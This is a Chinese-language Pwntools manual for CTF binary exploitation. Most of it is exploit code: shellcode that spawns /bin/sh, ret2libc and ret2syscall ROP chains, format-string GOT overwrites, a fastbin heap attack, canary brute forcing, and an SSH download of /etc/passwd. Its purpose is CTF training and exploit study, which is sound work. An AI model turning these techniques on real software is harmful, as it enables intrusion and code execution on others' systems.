# Pwntools 使用手册（CTF Pwn工具库）

> Pwntools 是一个专为CTF Pwn（二进制利用）竞赛设计的Python框架,提供了完整的漏洞利用开发工具链。

---

## 目录
1. [概述](#概述)
2. [安装方法](#安装方法)
3. [核心模块](#核心模块)
4. [进程交互](#进程交互)
5. [网络通信](#网络通信)
6. [ELF文件处理](#elf文件处理)
7. [shellcode生成](#shellcode生成)
8. [ROP链构造](#rop链构造)
9. [格式化字符串](#格式化字符串)
10. [CTF实战案例](#ctf实战案例)
11. [调试技巧](#调试技巧)
12. [参考资源](#参考资源)

---

## 概述

Pwntools 是CTF Pwn领域最流行的Python框架,提供:
- **进程交互**: 本地/远程进程通信
- **ELF处理**: 二进制文件分析和操作
- **Shellcode**: 多架构shellcode生成
- **ROP**: 自动化ROP链构造
- **格式化字符串**: 自动化格式化字符串漏洞利用
- **编码工具**: 数据编码/解码/打包/解包

**适用场景**:
- CTF Pwn题目
- 二进制漏洞利用开发
- 缓冲区溢出攻击
- ROP/堆利用

---

## 安装方法

```bash
# Ubuntu/Debian 安装依赖
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential

# 安装 pwntools
pip3 install pwntools

# 或从源码安装最新版
git clone https://github.com/Gallopsled/pwntools
cd pwntools
pip3 install -e .

# 验证安装
python3 -c "from pwn import *; print(context.arch)"
```

---

## 核心模块

### 1. 上下文配置

```python
from pwn import *

# 设置架构和操作系统
context.arch = 'amd64'  # i386, arm, mips等
context.os = 'linux'
context.endian = 'little'
context.word_size = 64

# 设置日志级别
context.log_level = 'debug'  # debug, info, warn, error

# 常用配置示例
context(arch='i386', os='linux', log_level='info')
```

### 2. 数据打包与解包

```python
from pwn import *

# 打包数据
p32(0x12345678)  # b'\x78\x56\x34\x12' (little-endian 32位)
p64(0x12345678)  # b'\x78\x56\x34\x12\x00\x00\x00\x00' (64位)
u32(b'\x78\x56\x34\x12')  # 0x12345678 (解包32位)
u64(b'\x78\x56\x34\x12\x00\x00\x00\x00')  # 0x12345678

# 字符串操作
flat(['AAAA', 0x12345678, 'BBBB'])  # b'AAAA\x78\x56\x34\x12BBBB'
cyclic(100)  # 生成100字节循环模式(用于确定偏移)
cyclic_find(0x61616161)  # 查找模式位置
```

---

## 进程交互

### 本地进程

```python
from pwn import *

# 启动本地进程
p = process('./vulnerable_binary')

# 发送数据
p.send(b'Hello\n')
p.sendline(b'Hello')  # 自动添加换行符
p.sendafter(b'Enter name:', b'Alice\n')  # 等待特定输出后发送

# 接收数据
data = p.recv(1024)  # 接收最多1024字节
data = p.recvline()  # 接收一行
data = p.recvuntil(b'Password:')  # 接收直到特定字符串
data = p.recvall()  # 接收所有数据直到EOF

# 交互式shell
p.interactive()  # 进入交互模式

# 关闭进程
p.close()
```

### 远程连接

```python
from pwn import *

# 连接远程服务
r = remote('pwn.challenge.com', 1337)

# 发送和接收
r.sendline(b'A' * 100)
r.recvuntil(b'flag{')
flag = r.recvline().strip()
print(f"Flag: flag{{{flag.decode()}}}")

r.close()
```

### 完整示例: 缓冲区溢出

```python
from pwn import *

# 配置
context(arch='i386', os='linux')
binary = './vuln'

# 本地调试
if args.LOCAL:
    p = process(binary)
else:
    p = remote('pwn.example.com', 1337)

# 构造payload
offset = 112  # 通过调试确定
ret_addr = 0x08048586  # 目标函数地址
payload = b'A' * offset + p32(ret_addr)

# 发送exploit
p.sendlineafter(b'Input:', payload)

# 获取shell
p.interactive()
```

---

## 网络通信

### TCP/UDP通信

```python
from pwn import *

# TCP连接
conn = remote('example.com', 8080)
conn.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
response = conn.recvall()
print(response)
conn.close()

# 监听端口
listener = listen(1337)
client = listener.wait_for_connection()
client.sendline(b'Welcome!')
data = client.recvline()
```

### SSH连接

```python
from pwn import *

# SSH连接
shell = ssh('user', 'host', password='password')

# 执行命令
output = shell['ls -la']
print(output.decode())

# 上传/下载文件
shell.upload('local.txt', '/tmp/remote.txt')
shell.download('/etc/passwd', 'passwd.txt')

# 启动进程
p = shell.process(['./binary'])
p.sendline(b'input')
p.interactive()
```

---

## ELF文件处理

### ELF分析

```python
from pwn import *

# 加载ELF文件
elf = ELF('./binary')

# 查看基本信息
print(f"Architecture: {elf.arch}")
print(f"Entry point: {hex(elf.entry)}")
print(f"PIE enabled: {elf.pie}")
print(f"NX enabled: {elf.nx}")
print(f"Canary: {elf.canary}")

# 查找符号
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
main_addr = elf.symbols['main']

print(f"puts@plt: {hex(plt_puts)}")
print(f"puts@got: {hex(got_puts)}")
print(f"main: {hex(main_addr)}")

# 查找字符串
bin_sh = next(elf.search(b'/bin/sh'))
print(f"/bin/sh address: {hex(bin_sh)}")

# 查找gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret: {hex(pop_rdi)}")
```

### ELF修改

```python
from pwn import *

# 加载ELF
elf = ELF('./binary')

# 修改数据
elf.write(0x08048000, b'\x90' * 10)  # 写入NOP指令

# 修改权限
elf.make_writable(0x08048000)

# 保存修改
elf.save('./patched_binary')
```

---

## Shellcode生成

### 基本Shellcode

```python
from pwn import *

# 设置架构
context.arch = 'amd64'

# 生成shellcode
shellcode = shellcraft.sh()  # 执行/bin/sh
shellcode_bytes = asm(shellcode)

print(f"Shellcode length: {len(shellcode_bytes)}")
print(f"Shellcode: {shellcode_bytes.hex()}")

# 使用shellcode
p = process('./vuln')
p.sendline(shellcode_bytes + b'A' * (offset - len(shellcode_bytes)) + p64(buffer_addr))
p.interactive()
```

### 多架构Shellcode

```python
from pwn import *

# x86 32位 shellcode
context.arch = 'i386'
shellcode_32 = asm(shellcraft.sh())
print(f"x86 shellcode: {shellcode_32.hex()}")

# x86 64位 shellcode
context.arch = 'amd64'
shellcode_64 = asm(shellcraft.sh())
print(f"x64 shellcode: {shellcode_64.hex()}")

# ARM shellcode
context.arch = 'arm'
shellcode_arm = asm(shellcraft.sh())
print(f"ARM shellcode: {shellcode_arm.hex()}")

# MIPS shellcode
context.arch = 'mips'
shellcode_mips = asm(shellcraft.sh())
print(f"MIPS shellcode: {shellcode_mips.hex()}")
```

### 自定义Shellcode

```python
from pwn import *

context.arch = 'amd64'

# 自定义汇编代码
shellcode = shellcraft.pushstr('/bin/sh')  # 将字符串压栈
shellcode += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)  # execve系统调用

# 编译shellcode
shellcode_bytes = asm(shellcode)

# 或直接写汇编
custom_asm = '''
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
'''
shellcode_bytes = asm(custom_asm)
```

---

## ROP链构造

### 自动ROP

```python
from pwn import *

# 加载二进制
elf = ELF('./vuln')
rop = ROP(elf)

# 构造ROP链: system("/bin/sh")
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 获取ROP链
payload = b'A' * offset + rop.chain()

# 发送exploit
p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 手动ROP - ret2libc

```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 泄露libc地址
p = process('./vuln')

# 第一阶段: 泄露puts地址
pop_rdi = 0x0000000000401273  # pop rdi; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

p.sendlineafter(b'Input:', payload1)
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts: {hex(puts_leak)}")

# 计算libc基址
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System: {hex(system_addr)}")
log.success(f"/bin/sh: {hex(bin_sh_addr)}")

# 第二阶段: 执行system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendlineafter(b'Input:', payload2)
p.interactive()
```

### ROP - ret2syscall

```python
from pwn import *

context(arch='i386', os='linux')
elf = ELF('./vuln32')

# 查找gadgets
pop_eax_ret = 0x080bb196  # pop eax; ret
pop_ebx_ret = 0x080481c9  # pop ebx; ret
pop_ecx_edx_ret = 0x080dce4a  # pop ecx; pop edx; ret
int_0x80 = 0x08049421  # int 0x80

# 在二进制中查找 "/bin/sh"
bin_sh = next(elf.search(b'/bin/sh'))

# 构造ROP链: execve("/bin/sh", 0, 0)
payload = b'A' * offset
payload += p32(pop_eax_ret) + p32(0xb)  # eax = 11 (sys_execve)
payload += p32(pop_ebx_ret) + p32(bin_sh)  # ebx = "/bin/sh"
payload += p32(pop_ecx_edx_ret) + p32(0) + p32(0)  # ecx = 0, edx = 0
payload += p32(int_0x80)  # 触发系统调用

p = process('./vuln32')
p.sendline(payload)
p.interactive()
```

---

## 格式化字符串

### 自动化格式化字符串利用

```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./vuln')

# 连接进程
p = process('./vuln')

# 自动生成格式化字符串payload
autofmt = FmtStr(execute_fmt=lambda x: p.sendline(x))

# 读取内存
leaked = autofmt[elf.got['printf']]
log.info(f"Leaked printf GOT: {hex(leaked)}")

# 写入内存
win_addr = elf.symbols['win']
autofmt[elf.got['printf']] = win_addr

p.interactive()
```

### 手动格式化字符串

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')

# 泄露内存
p = process('./vuln')
p.sendline(b'%3$p')  # 泄露第3个参数
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked value: {hex(leak)}")

# 任意地址写入
target_addr = elf.got['printf']
value = 0x12345678

# 生成payload
payload = fmtstr_payload(6, {target_addr: value})
p.sendline(payload)

p.interactive()
```

### 格式化字符串信息泄露

```python
from pwn import *

p = process('./vuln')

# 泄露栈上数据
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())
    try:
        leak = p.recvline()
        log.info(f"Offset {i}: {leak.strip()}")
    except:
        pass

# 泄露字符串
p.sendline(b'%3$s')  # 泄露第3个参数指向的字符串
leaked_str = p.recvuntil(b'\n')
log.info(f"Leaked string: {leaked_str}")
```

---

## CTF实战案例

### 案例1: 栈溢出 + ret2libc

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# 配置
binary = './pwn1'
elf = ELF(binary)
libc = ELF('./libc.so.6')

if args.REMOTE:
    p = remote('pwn.challenge.com', 10001)
else:
    p = process(binary)

# 确定偏移
offset = 72

# Stage 1: 泄露libc
pop_rdi = 0x0000000000401273
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

payload1 = flat([
    b'A' * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main
])

p.sendlineafter(b'>', payload1)
p.recvline()
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Puts leak: {hex(puts_leak)}")

# 计算libc基址
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System: {hex(system)}")

# Stage 2: 执行system("/bin/sh")
ret = 0x000000000040101a  # ret gadget (栈对齐)
payload2 = flat([
    b'A' * offset,
    ret,
    pop_rdi,
    bin_sh,
    system
])

p.sendlineafter(b'>', payload2)
p.interactive()
```

### 案例2: 格式化字符串任意写

```python
#!/usr/bin/env python3
from pwn import *

context(arch='i386', os='linux', log_level='debug')

binary = './pwn2'
elf = ELF(binary)
p = process(binary)

# 目标: 修改GOT表,劫持控制流
target = elf.got['printf']
win_func = elf.symbols['win']

log.info(f"Target GOT: {hex(target)}")
log.info(f"Win function: {hex(win_func)}")

# 生成格式化字符串payload
# 假设格式化字符串在栈偏移10处
payload = fmtstr_payload(10, {target: win_func}, write_size='short')

p.sendlineafter(b'Name:', payload)
p.interactive()
```

### 案例3: 堆溢出 - fastbin attack

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')

binary = './heap_pwn'
libc = ELF('./libc.so.6')
p = process(binary)

def add(size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Data:', data)

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Index:', str(idx).encode())

# 分配和释放chunk创建fastbin
add(0x68, b'AAAA')  # chunk 0
add(0x68, b'BBBB')  # chunk 1
add(0x68, b'CCCC')  # chunk 2

delete(0)
delete(1)

# 利用UAF修改fd指针
add(0x68, p64(0x602060))  # 伪造fastbin链表

# 再次分配触发任意地址写
add(0x68, b'padding')
add(0x68, b'/bin/sh\x00' + p64(system_addr))

p.interactive()
```

---

## 调试技巧

### GDB集成

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# 启动进程并附加GDB
p = gdb.debug('./vuln', '''
break main
continue
''')

# 发送payload
p.sendline(b'AAAA')

# 等待断点
pause()

# 继续执行
p.interactive()
```

### 本地/远程切换

```python
from pwn import *

context.log_level = 'debug'

def exploit():
    # 统一exploit逻辑
    offset = 112
    payload = b'A' * offset + p64(0x401234)

    io.sendlineafter(b'Input:', payload)
    io.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        io = remote('pwn.example.com', 1337)
    elif args.GDB:
        io = gdb.debug('./vuln', 'break main')
    else:
        io = process('./vuln')

    exploit()
```

### 日志和调试

```python
from pwn import *

# 设置日志级别
context.log_level = 'debug'  # 显示所有通信细节

# 自定义日志
log.info("Starting exploit...")
log.success("Leaked address: 0x12345678")
log.warning("Potential issue detected")
log.error("Exploit failed")

# 条件日志
if args.DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

# 保存通信日志
p = process('./vuln')
p.recvuntil(b'Input:')
log.info(f"Received: {p.clean()}")
```

---

## 高级技巧

### 多线程爆破

```python
from pwn import *
from threading import Thread

context.log_level = 'error'

def bruteforce(canary):
    try:
        p = remote('127.0.0.1', 1337)
        payload = b'A' * 40 + p32(canary)
        p.send(payload)
        response = p.recvall(timeout=1)
        if b'correct' in response:
            log.success(f"Found canary: {hex(canary)}")
            return True
    except:
        pass
    finally:
        p.close()
    return False

threads = []
for i in range(0x00, 0xff):
    t = Thread(target=bruteforce, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### DynELF - 无libc泄露

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln')

# 定义泄露函数
def leak(address):
    # 构造payload泄露指定地址的内容
    payload = b'A' * offset + p64(pop_rdi) + p64(address) + p64(puts_plt) + p64(main)
    p.sendline(payload)
    data = p.recvline()[:-1]
    return data

# 使用DynELF查找函数地址
d = DynELF(leak, elf=ELF('./vuln'))
system_addr = d.lookup('system', 'libc')
log.success(f"System address: {hex(system_addr)}")
```

---

## 常见问题解决

### 问题1: "EOFError: No more data"

**原因**: 进程意外终止或没有输出
**解决**:
```python
# 添加超时和错误处理
try:
    data = p.recv(timeout=2)
except EOFError:
    log.error("Process terminated unexpectedly")
    exit()
```

### 问题2: 栈对齐问题

**原因**: x64架构下某些函数要求16字节栈对齐
**解决**:
```python
# 在调用system等函数前添加一个ret gadget
ret = 0x40101a  # ret指令地址
payload = flat([
    b'A' * offset,
    ret,  # 栈对齐
    pop_rdi,
    bin_sh,
    system
])
```

### 问题3: PIE和ASLR绕过

```python
# 泄露程序基址
p.sendline(b'%3$p')
leak = int(p.recvline().strip(), 16)
base = leak - 0x1234  # 根据偏移计算基址

# 计算实际地址
target = base + 0x5678
```

---

## 参考资源

### 官方资源
- **GitHub**: https://github.com/Gallopsled/pwntools
- **文档**: https://docs.pwntools.com/
- **教程**: https://github.com/Gallopsled/pwntools-tutorial

### 学习资源
- **CTF Wiki**: https://ctf-wiki.org/pwn/
- **Pwn College**: https://pwn.college/
- **ROP Emporium**: https://ropemporium.com/

### 工具集成
- **GDB**: 调试器集成
- **ROPgadget**: Gadget查找工具
- **one_gadget**: 一键获取shell的gadget
- **LibcSearcher**: Libc版本识别

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用版本**: Pwntools v4.11+
